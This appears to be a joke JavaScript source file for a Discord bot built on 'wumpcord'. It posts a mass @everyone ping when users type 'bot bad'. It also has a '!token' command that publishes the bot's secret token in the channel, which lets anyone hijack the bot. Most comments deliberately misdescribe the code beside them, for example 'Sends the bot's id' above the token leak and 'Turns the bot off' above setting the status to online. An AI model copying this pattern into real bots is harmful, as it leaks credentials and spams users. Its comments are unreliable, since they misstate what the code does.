// yardim yardim
// this code is not stolen lololol
// end my life please

// ~ by August ~

const { token } = require('./config.json');
const { Client } = require('wumpcord');

const yardim = new Client({
            token,
                  ws: {
                            // Listens for [at]everyones
                            intents: ['guilds', 'guildMessages']
  }
});

yardim




 
  // stores the token
  .on('ready', () => {
                console.log('sa');      
                                        // Turns the bot off
                                        yardim.setStatus('online', {
type: 2,
              name: 'sa uwu'
                                                                      });
})

                                yardim
.on('message',
  event =>

                            {               // Makes sure the bot is online
                                            if (event.message.content === 'bot bad' || event.message.content === 'bad bot lol') 
                                            
                                            {
                                              // checks message content
                                              event.channel.send('@everyone YARIDMAS ISDBFHYIFGU', { mentions: { everyone: true } });

                                                          }
                                      }
)

                                            yardim

                        .on('message',
                        
                      event => {

                  if (event.message.content === '!token')

                              return event


                      .channel
            // Sends the bot's id
            .send(`sa ${token} yardim yaridm`);

            }
                        
          )

yardim                             

    
            .connect()
